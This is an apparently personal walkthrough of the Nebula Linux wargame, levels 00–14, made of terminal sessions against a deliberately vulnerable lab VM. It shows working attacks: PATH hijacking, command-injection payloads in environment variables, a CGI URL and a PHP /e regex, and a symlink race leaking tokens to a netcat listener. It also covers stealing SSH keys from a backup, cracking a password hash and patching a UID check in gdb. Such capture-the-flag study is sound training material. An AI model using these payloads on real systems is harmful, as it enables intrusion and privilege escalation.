#!/bin/intx0x80





##########################################################
#							 #
#							 #
#      _   __     __          __                         #
#     / | / /__  / /_  __  __/ /___ _                    #
#    /  |/ / _ \/ __ \/ / / / / __ `/                    #
#   / /|  /  __/ /_/ / /_/ / / /_/ / 			 #
#  /_/ |_/\___/_.___/\__,_/_/\__,_/                      #
#							 #	
#    exploit-exercises.com/nebula			 #
#							 #
#							 #
#							 #
#							 #
#                                                        #
#                                                        #
##########################################################





################################
#			       #
#        Level 00 -19	       #
#			       #
#			       #
################################





###############################
#             level00         #
###############################



level00@nebula:~$ find / -perm -4000  2>/dev/null
/bin/.../flag00
/bin/fusermount
/bin/mount
/bin/ping
/bin/ping6
/bin/su
/bin/umount
/sbin/mount.ecryptfs_private
/usr/bin/at
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/sudoedit
/usr/bin/traceroute6.iputils
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/sbin/pppd
/usr/sbin/uuidd
/rofs/bin/.../flag00


level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$


###############################
#             level01         #
###############################





level01@nebula:~$ cat  /tmp/echo
#!/bin/sh
getflag
level01@nebula:~$
level01@nebula:~$ export PATH=/tmp:$PATH
level01@nebula:~$ cd ../flag01/
level01@nebula:/home/flag01$ ls
flag01
level01@nebula:/home/flag01$ ./flag01
You have successfully executed getflag on a target account




###############################
#             level02         #
###############################



/bin/echo ; id; is cool"


level02@nebula:/home/flag02$ USER=';id;' &&./flag02
about to call system("/bin/echo ;id; is cool")

uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02)


level02@nebula:/home/flag02$ USER=';getflag;' &&./flag02
about to call system("/bin/echo ;getflag; is cool")

You have successfully executed getflag on a target account


###############################
#             level03         #
###############################



level03@nebula:/home/flag03$ cat writable.sh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done



create file file inside writable.d 



level03@nebula:/home/flag03/writable.d$ cat pwn
getflag>/tmp/flag




level03@nebula:/home/flag03/writable.d$ cat /tmp/flag
You have successfully executed getflag on a target account



###############################
#             level04         #
###############################





level04@nebula:/home/flag04$ ln /home/flag04/token /tmp/flag

ln: creating hard link `/tmp/flag' => `/home/flag04/token': Invalid cross-device link

level04@nebula:/home/flag04$ ./flag04 /tmp/flag

You have successfully executed getflag on a target account



###############################
#             level05         #
###############################




level05@nebula:/home/flag05$ ls -a
.  ..  .backup  .bash_history  .bash_logout  .bashrc  .cache  .profile  .ssh


level05@nebula:/home/flag05/.backup$ ls
backup-19072011.tgz


level05@nebula:/home/flag05/.backup$ tar -xvzf backup-19072011.tgz  -C /tmp/
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:/home/flag05/.backup$



level05@nebula:/home/flag05/.backup$ chmod 0600 /home/level05/id_rsa


level05@nebula:/home/flag05/.backup$ cat /etc/passwd|grep "flag05"
flag05:x:994:994::/home/flag05:/bin/sh


level05@nebula:/home/flag05/.backup$ ssh -i /home/level05/id_rsa flag05@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of "levelXX" and password "levelXX", where
XX is the level number.

Currently there are 20 levels (00 - 19).


Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release '12.04 LTS' available.
Run 'do-release-upgrade' to upgrade to it.




flag05@nebula:~$ getflag
You have successfully executed getflag on a target account



###############################
#             level06         #
###############################





level06@nebula:/home/flag06$ cat /etc/passwd|grep "flag06"
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh


ueqwOCnSGdsuM 



copy to kali and create file named LOL

run john 

~ #johon LOL

password is [hello]



level06@nebula:/home/flag06$ su flag06

 Password:
sh-4.2$ getflag
You have successfully executed getflag on a target account


###############################
#             level07         #
###############################




level07@nebula:/home/flag07$ ls
index.cgi  thttpd.conf


index.cgi vulnerabel to Command injection 



        @output = `ping -c 3 $host 2>&1`;
        foreach $line (@output) { print "$line"; }






level07@nebula:/home/flag07$ nano thttpd.conf



# Specifies an alternate port number to listen on.
port=7007





~#curl -v http://192.168.207.144:7007/index.cgi?Host=|getflag >/tmp/flag -O /dev/null

level07@nebula:/home/flag07$cat /tmp/flag
You have successfully executed getflag on a target account



###############################
#             level08         #
###############################


open pcap file by wireshark 



000000B9  62                                               b
000000BA  61                                               a
000000BB  63                                               c
000000BC  6b                                               k
000000BD  64                                               d
000000BE  6f                                               o
000000BF  6f                                               o
000000C0  72                                               r
000000C1  7f                                               .---->7f
000000C2  7f                                               .---->7f
000000C3  7f                                               .---->7f
000000C4  30                                               0
000000C5  30                                               0
000000C6  52                                               R
000000C7  6d                                               m
000000C8  38                                               8
000000C9  7f                                               .---->7f
000000CA  61                                               a
000000CB  74                                               t
000000CC  65                                               e
000000CD  0d                                               .





man ascii 

reveal that 7f it's backspace or del this mean remove . and remove pervious char 

this raw password after remove 3 chars  and one char 
backdoor...00Rm8.ate

backd[oor][...]00Rmp[8][.]ate

after remove it will be 

backd00Rmate 


level08@nebula:/home/flag08$ su - flag08
Password:
flag08@nebula:~$ getflag
You have successfully executed getflag on a target account




###############################
#             level09         #
###############################






<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);

  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents); --->vulnerable to RCE by use /e modifier 
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>



level09@nebula:/home/flag09$ cat /tmp/email
[email intx0x80@root.com]


level09@nebula:/home/flag09$ ./flag09 /tmp/email
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
intx0x80 AT root dot com


level09@nebula:/home/flag09$ cat /tmp/pwn
[email {${`$use_me`}}]


level09@nebula:/home/flag09$ ./flag09 /tmp/pwn  `getflag`
PHP Notice:  Undefined variable: You have successfully executed getflag on a target account
 in /home/flag09/flag09.php(15) : regexp code on line 1



###############################
#             level10         #
###############################




First Terminal


level10@nebula:/home/flag10$ while true; do ln -sf /var/tmp/shell.c /var/tmp/flag10-token; ln -sf /home/flag10/token /var/tmp/flag10-token; done &
[1] 17816


Second Terminal


level10@nebula:/home/flag10$ while true;do ./flag10 /var/tmp/flag10-token 127.0.0.1;done


Third

level10@nebula:~$ nc -lk 18211




.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27 ----->Token

.oO Oo.
#include<stdio.h>

int main(void) {
    setresuid(geteuid(), geteuid(), geteuid());
    system("/bin/sh");
    return 0;
}



level10@nebula:~$ su flag10
Password:
sh-4.2$ getflag
You have successfully executed getflag on a target account
sh-4.2$



###############################
#             level11         #
###############################







###############################
#             level12         #
###############################



vulnerable function 

function hash(password)
        prog = io.popen("echo "..password.." | sha1sum", "r") --->
        data = prog:read("*all")
        prog:close()




level12@nebula:/home/flag12$ time echo ';sleep 5'|nc 127.0.0.1 50001
Password: Better luck next time

real    0m5.010s
user    0m0.000s
sys     0m0.000s


it blind command injection 


level12@nebula:/home/flag12$ time echo ';sleep 5'|nc 127.0.0.1 50001
Password: Better luck next time

real    0m5.010s
user    0m0.000s
sys     0m0.000s




level12@nebula:/home/flag12$ echo ';id >/tmp/id'|nc 127.0.0.1 50001
Password: Better luck next time
level12@nebula:/home/flag12$ cat /tmp/id
uid=987(flag12) gid=987(flag12) groups=987(flag12)



level12@nebula:/home/flag12$ echo ';getflag >/tmp/flag12'|nc 127.0.0.1 50001
Password: Better luck next time
level12@nebula:/home/flag12$ cat /tmp/flag12
You have successfully executed getflag on a target account
level12@nebula:/home/flag12$




###############################
#             level13         #
###############################





Dump of assembler code for function main:
   0x080484c4 <+0>:     push   %ebp
   0x080484c5 <+1>:     mov    %esp,%ebp
   0x080484c7 <+3>:     push   %edi
   0x080484c8 <+4>:     push   %ebx
   0x080484c9 <+5>:     and    $0xfffffff0,%esp
   0x080484cc <+8>:     sub    $0x130,%esp
   0x080484d2 <+14>:    mov    0xc(%ebp),%eax
   0x080484d5 <+17>:    mov    %eax,0x1c(%esp)
   0x080484d9 <+21>:    mov    0x10(%ebp),%eax
   0x080484dc <+24>:    mov    %eax,0x18(%esp)
   0x080484e0 <+28>:    mov    %gs:0x14,%eax
   0x080484e6 <+34>:    mov    %eax,0x12c(%esp)
   0x080484ed <+41>:    xor    %eax,%eax
   0x080484ef <+43>:    call   0x80483c0 <getuid@plt>
  *0x080484f4 <+48>:    cmp    $0x3e8,%eax---------------------  3e8==1000 
   0x080484f9 <+53>:    je     0x8048531 <main+109>	      |	
   0x080484fb <+55>:    call   0x80483c0 <getuid@plt> -------------------------> display uid for current user 
   0x08048500 <+60>:    mov    $0x80486d0,%edx                |
   0x08048505 <+65>:    movl   $0x3e8,0x8(%esp)               |
   0x0804850d <+73>:    mov    %eax,0x4(%esp)                 |
   0x08048511 <+77>:    mov    %edx,(%esp)                    |
   0x08048514 <+80>:    call   0x80483a0 <printf@plt>         |
   0x08048519 <+85>:    movl   $0x804870c,(%esp)              |
   0x08048520 <+92>:    call   0x80483d0 <puts@plt>           |
   0x08048525 <+97>:    movl   $0x1,(%esp)                    |
   0x0804852c <+104>:   call   0x80483f0 <exit@plt>           |
   0x08048531 <+109>:   lea    0x2c(%esp),%eax <--------------|
   0x08048535 <+113>:   mov    %eax,%ebx
   0x08048537 <+115>:   mov    $0x0,%eax
   0x0804853c <+120>:   mov    $0x40,%edx
   0x08048541 <+125>:   mov    %ebx,%edi
   0x08048543 <+127>:   mov    %edx,%ecx
   0x08048545 <+129>:   rep stos %eax,%es:(%edi)
   0x08048547 <+131>:   mov    $0x804874c,%edx
   0x0804854c <+136>:   lea    0x2c(%esp),%eax
   0x08048550 <+140>:   mov    (%edx),%ecx
   0x08048552 <+142>:   mov    %ecx,(%eax)
   0x08048554 <+144>:   mov    0x4(%edx),%ecx
   0x08048557 <+147>:   mov    %ecx,0x4(%eax)
   0x0804855a <+150>:   mov    0x8(%edx),%ecx
   0x0804855d <+153>:   mov    %ecx,0x8(%eax)
   0x08048560 <+156>:   mov    0xc(%edx),%ecx
   0x08048563 <+159>:   mov    %ecx,0xc(%eax)
   0x08048566 <+162>:   mov    0x10(%edx),%ecx

(gdb) run eee
Starting program: /home/flag13/flag13 eee
Security failure detected. UID 1014 started us, we expect 1000 ---->
The system administrators will be notified of this violation
[Inferior 1 (process 6473) exited with code 01]

to solve it we need first breakpoint in  0x080484f4 
and run to see what we find in registers

(gdb) break *0x080484f4
Breakpoint 1 at 0x80484f4
(gdb) r
Starting program: /home/flag13/flag13

Breakpoint 1, 0x080484f4 in main ()
(gdb) info reg
eax            0x3f6    1014 ------------------------> value inside eax
ecx            0xbfac4194       -1079230060
edx            0xbfac4124       -1079230172
ebx            0x600ff4 6295540
esp            0xbfac3fc0       0xbfac3fc0
ebp            0xbfac40f8       0xbfac40f8
esi            0x0      0
edi            0x0      0
eip            0x80484f4        0x80484f4 <main+48>
eflags         0x282    [ SF IF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb)



after run it now we can figure out application it works comapre uid for user with 1000 if equal it we can bypass and getflag 


level13@nebula:/home/flag13$ id
uid=1014(level13) gid=1014(level13) groups=1014(level13)




edit eax register




(gdb) break *0x080484f4
Breakpoint 1 at 0x80484f4
(gdb) run
Starting program: /home/flag13/flag13

Breakpoint 1, 0x080484f4 in main ()
(gdb) set $eax=1000
(gdb) info reg
eax            0x3e8    1000
ecx            0xbfbeef94       -1078005868
edx            0xbfbeef24       -1078005980
ebx            0x5b9ff4 6004724
esp            0xbfbeedc0       0xbfbeedc0
ebp            0xbfbeeef8       0xbfbeeef8
esi            0x0      0
edi            0x0      0
eip            0x80484f4        0x80484f4 <main+48>
eflags         0x282    [ SF IF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) c
Continuing.
your token is b705702b-76a8-42b0-8844-3adabbe5ac58  ---> flag13 password ;)
[Inferior 1 (process 3623) exited with code 063]




level13@nebula:/home/flag13$ su flag13
 Password:
sh-4.2$ getflag
You have successfully executed getflag on a target account
sh-4.2$




###############################
#             level14         #
###############################


#include <stdio.h>

int main(){
    int i = 0;
    char *TOKEN = "857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.";
    for(i = 0; i<36; i++)
        printf("%c", TOKEN[i]-i);
    
}


8457c118-887c-4e40-a5a6-33a25353165





level14@nebula:/home/flag14$ su flag14
Password:
sh-4.2$ getflag
You have successfully executed getflag on a target account
sh-4.2$




###############################
#             level15         #
###############################


###############################
#             level16         #
###############################



###############################
#             level17         #
###############################



###############################
#             level18         #
###############################




###############################
#             level19         #
###############################



Reference:
http://www.madirish.net/402
